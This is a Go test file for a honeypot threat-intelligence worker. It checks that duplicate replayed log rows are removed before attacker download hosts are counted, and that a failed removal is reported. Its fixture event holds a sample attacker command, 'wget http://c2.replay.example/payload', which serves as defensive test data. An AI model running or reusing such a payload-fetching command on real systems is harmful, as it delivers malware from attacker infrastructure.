package intelligence

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// replayDB is fakeDB with a store that knows which rows are second copies of
// an observation (their ID ends in "-replay") and deletes them when asked.
type replayDB struct {
	*fakeDB
	fail    error
	removed []string
}

func (d *replayDB) RemoveReplayedEvents(_ context.Context, events []*database.Event) ([]*database.Event, int, error) {
	if d.fail != nil {
		return nil, 0, d.fail
	}
	var kept []*database.Event
	n := 0
	for _, e := range events {
		if strings.HasSuffix(e.ID, "-replay") {
			d.removed = append(d.removed, e.ID)
			n++
			continue
		}
		kept = append(kept, e)
	}
	// The deleted rows are gone from the store.
	left := d.fakeDB.events[:0]
	for _, e := range d.fakeDB.events {
		if !strings.HasSuffix(e.ID, "-replay") {
			left = append(left, e)
		}
	}
	d.fakeDB.events = left
	return kept, n, nil
}

func fetchEvent(id string, at time.Time) *database.Event {
	return &database.Event{ID: id, Honeypot: "cowrie", EventType: "command",
		Command: "wget http://c2.replay.example/payload", SourceIP: "203.0.113.5", Timestamp: at}
}

// sightings returns how often the worker counted the download host.
func sightings(db *fakeDB) int64 {
	db.storeMu.Lock()
	defer db.storeMu.Unlock()
	var n int64
	for _, ioc := range db.iocRows {
		if strings.Contains(ioc.Value, "c2.replay.example") && ioc.Type == "domain" {
			n += ioc.Count
		}
	}
	return n
}

// A log line the collector read twice is two rows. The worker must count it
// once and say how many rows it removed.
func TestWorkerDoesNotCountAReplayedEvent(t *testing.T) {
	now := time.Now().UTC()
	rows := func() []*database.Event {
		return []*database.Event{fetchEvent("a", now), fetchEvent("a-replay", now.Add(time.Second)), fetchEvent("b", now.Add(2*time.Second))}
	}

	// Control: a store that cannot tell copies apart counts all three.
	plain := &fakeDB{events: rows()}
	w := newTestWorker(t, plain)
	if n := w.runOnce(context.Background()); n != 3 {
		t.Fatalf("control: runOnce handled %d events, want 3", n)
	}
	control := sightings(plain)
	if control != 3 {
		t.Fatalf("control: the download host was counted %d times, want 3 (the test would prove nothing)", control)
	}

	db := &replayDB{fakeDB: &fakeDB{events: rows()}}
	w = newTestWorker(t, db.fakeDB)
	w.db = db
	if n := w.runOnce(context.Background()); n != 2 {
		t.Fatalf("runOnce classified %d events, want the 2 that are not second copies", n)
	}
	if got := sightings(db.fakeDB); got != 2 {
		t.Errorf("the download host was counted %d times, want 2", got)
	}
	if got := w.ReplaysRemoved(); got != 1 {
		t.Errorf("ReplaysRemoved() = %d, want 1", got)
	}
	if len(db.removed) != 1 || db.removed[0] != "a-replay" {
		t.Errorf("removed rows %v, want [a-replay]", db.removed)
	}
	if err := w.LastError(); err != nil {
		t.Errorf("worker reports an error after removing a replay: %v", err)
	}
}

// A batch made only of second copies leaves nothing to classify. That is
// progress, not an idle pass and not an error.
func TestWorkerBatchOfOnlyReplays(t *testing.T) {
	now := time.Now().UTC()
	db := &replayDB{fakeDB: &fakeDB{events: []*database.Event{fetchEvent("a-replay", now), fetchEvent("b-replay", now)}}}
	w := newTestWorker(t, db.fakeDB)
	w.db = db
	n, ok := w.runBatch(context.Background())
	if n != 2 || !ok {
		t.Fatalf("runBatch = %d, %v; want 2 rows handled and success", n, ok)
	}
	if got := sightings(db.fakeDB); got != 0 {
		t.Errorf("second copies were counted %d times", got)
	}
	if db.fakeDB.taggedCount.Load() != 0 {
		t.Error("a deleted row was tagged")
	}
	if w.ReplaysRemoved() != 2 {
		t.Errorf("ReplaysRemoved() = %d, want 2", w.ReplaysRemoved())
	}
}

// When the store cannot remove second copies, nothing of the batch may be
// counted: the next pass reads the same rows and tries again.
func TestWorkerStopsWhenReplaysCannotBeRemoved(t *testing.T) {
	now := time.Now().UTC()
	db := &replayDB{fakeDB: &fakeDB{events: []*database.Event{fetchEvent("a", now), fetchEvent("a-replay", now)}}, fail: errors.New("database is away")}
	w := newTestWorker(t, db.fakeDB)
	w.db = db
	n, ok := w.runBatch(context.Background())
	if n != 0 || ok {
		t.Fatalf("runBatch = %d, %v; want 0 and failure", n, ok)
	}
	if got := sightings(db.fakeDB); got != 0 {
		t.Errorf("events were counted %d times although second copies could not be removed", got)
	}
	if w.LastError() == nil {
		t.Error("the failure is not reported")
	}
	db.fail = nil
	if n := w.runOnce(context.Background()); n != 1 {
		t.Fatalf("after the store is back, runOnce classified %d events, want 1", n)
	}
	if got := sightings(db.fakeDB); got != 1 {
		t.Errorf("the download host was counted %d times after recovery, want 1", got)
	}
}
